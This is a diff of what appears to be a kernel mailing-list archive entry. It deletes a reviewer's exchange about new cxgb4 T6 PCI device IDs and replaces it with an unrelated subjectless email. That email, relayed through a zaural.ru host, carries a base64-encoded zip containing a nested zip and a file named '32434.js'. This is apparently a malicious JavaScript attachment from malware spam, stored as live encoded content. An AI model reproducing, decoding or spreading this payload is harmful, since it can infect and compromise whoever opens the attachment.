@@ -1,72 +1,75 @@
-From: Ganesh GR <ganeshgr@chelsio.com>
-Subject: Re: [PATCH net-next] cxgb4: add new T6 pci device id's
-Date: Mon, 19 Jun 2017 09:57:23 +0000
-Message-ID: <CY4PR12MB1432768B2930D10BFA54E343C1C40@CY4PR12MB1432.namprd12.prod.outlook.com>
-References: <1497855249-7173-1-git-send-email-ganeshgr@chelsio.com>,<912f67f7-0bee-b4f4-73c6-6eebf80652cf@cogentembedded.com>
+From: <anita.traylor@maryvillecollege.edu>
+Subject: (unknown)
+Date: Mon, 19 Jun 2017 09:57:59 -0000
+Message-ID: <149786627909.29695.7032256577191777837@zaural.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
-Cc: Nirranjan Kirubaharan <nirranjan@chelsio.com>,
-        Indranil Choudhury <indranil@chelsio.com>,
-        Venkatesh Pottem <venkatesh@chelsio.com>
-To: Sergei Shtylyov <sergei.shtylyov@cogentembedded.com>,
-        "netdev@vger.kernel.org" <netdev@vger.kernel.org>,
-        "davem@davemloft.net" <davem@davemloft.net>
+Content-Type: application/zip; name="0868791.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-sn1nam02on0103.outbound.protection.outlook.com ([104.47.36.103]:58684
-        "EHLO NAM02-SN1-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1753936AbdFSJ50 (ORCPT <rfc822;netdev@vger.kernel.org>);
-        Mon, 19 Jun 2017 05:57:26 -0400
-In-Reply-To: <912f67f7-0bee-b4f4-73c6-6eebf80652cf@cogentembedded.com>
-Content-Language: en-US
+Received: from ws163.245.50.zone94.zaural.ru ([94.50.245.163]:33928 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752339AbdFSJ6D (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 19 Jun 2017 05:58:03 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-
-Thanks, I will send a V2.
-
-
-
-
-
-From: Sergei Shtylyov <sergei.shtylyov@cogentembedded.com>
-Sent: Monday, June 19, 2017 3:18 PM
-To: Ganesh GR; netdev@vger.kernel.org; davem@davemloft.net
-Cc: Nirranjan Kirubaharan; Indranil Choudhury; Venkatesh Pottem
-Subject: Re: [PATCH net-next] cxgb4: add new T6 pci device id's
-=A0  =20
-Hello!
-
-On 6/19/2017 9:54 AM, Ganesh Goudar wrote:
-
-> Add 0x6081, 0x6082 and 0x6083 T6 device id's
-
-=A0=A0=A0 0x6081 is already there, you're adding 0x6084 instead.
-
-> Signed-off-by: Ganesh Goudar <ganeshgr@chelsio.com>
-> ---
->=A0 drivers/net/ethernet/chelsio/cxgb4/t4_pci_id_tbl.h | 3 +++
->=A0 1 file changed, 3 insertions(+)
->
-> diff --git a/drivers/net/ethernet/chelsio/cxgb4/t4_pci_id_tbl.h b/drivers=
-/net/ethernet/chelsio/cxgb4/t4_pci_id_tbl.h
-> index be7041f..99987d8 100644
-> --- a/drivers/net/ethernet/chelsio/cxgb4/t4_pci_id_tbl.h
-> +++ b/drivers/net/ethernet/chelsio/cxgb4/t4_pci_id_tbl.h
-> @@ -192,6 +192,9 @@ CH_PCI_DEVICE_ID_TABLE_DEFINE_BEGIN
->=A0=A0=A0=A0=A0=A0=A0 CH_PCI_ID_TABLE_FENTRY(0x6015),
->=A0=A0=A0=A0=A0=A0=A0 CH_PCI_ID_TABLE_FENTRY(0x6080),
->=A0=A0=A0=A0=A0=A0=A0 CH_PCI_ID_TABLE_FENTRY(0x6081),
-> +=A0=A0=A0=A0 CH_PCI_ID_TABLE_FENTRY(0x6082), /* Custom T6225-CR SFP28 */
-> +=A0=A0=A0=A0 CH_PCI_ID_TABLE_FENTRY(0x6083), /* Custom T62100-CR QSFP28 =
-*/
-> +=A0=A0=A0=A0 CH_PCI_ID_TABLE_FENTRY(0x6084), /* Custom T64100-CR QSFP28 =
-*/
->=A0 CH_PCI_DEVICE_ID_TABLE_DEFINE_END;
->
->=A0 #endif /* __T4_PCI_ID_TBL_H__ */
-
-MBR, Sergei
-
-    =
+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
+DAAAAAA=
